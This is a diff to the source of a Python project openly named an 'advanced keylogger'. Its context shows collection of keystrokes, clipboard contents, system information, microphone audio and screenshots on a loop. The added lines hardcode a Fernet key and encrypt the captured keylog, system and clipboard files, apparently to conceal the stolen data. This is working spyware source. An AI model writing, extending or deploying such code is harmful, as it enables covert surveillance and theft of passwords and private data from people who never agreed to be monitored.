@@ -36,11 +36,19 @@ system_info = "sys_info.txt"
 clipboard_info = "clipboard.txt"
 audio_info = "audio_recording.wav"
 screenshot_info = "screenshot.png"
+
+key_info_e = "key_log_encrypted.txt"
+system_info_e = "sys_info_encrypted.txt"   
+clipboard_info_e = "clipboard_encrypted.txt"
+
+key = "7-2oBjGOW2nwL573jvPWQ9w9bcaVR6UA5BZlBqHWX0Q="
+
 microphone_time = 15
 time_iteration = 20
 number_of_iterations_end = 5
 file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
 extend = "\\"
+file_merge = file_path + extend
 
 def get_system_info():
     with open(file_path + extend + "sys_info.txt", "a") as f:
@@ -146,3 +154,24 @@ while number_of_iterations < number_of_iterations_end:
 
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
+
+
+files_to_encrypt = [file_merge + keys_info, file_merge + system_info, file_merge + clipboard_info]
+encrypted_files = [file_merge + key_info_e, file_merge + system_info_e, file_merge + clipboard_info_e]
+
+count = 0
+
+for encrypting_file in files_to_encrypt:
+
+    with open(files_to_encrypt[count], "rb") as f:
+        data = f.read
+    
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data())
+
+    with open(encrypted_files[count], "wb") as f:
+        f.write(encrypted)
+
+    count += 1
+
+time.sleep(120)
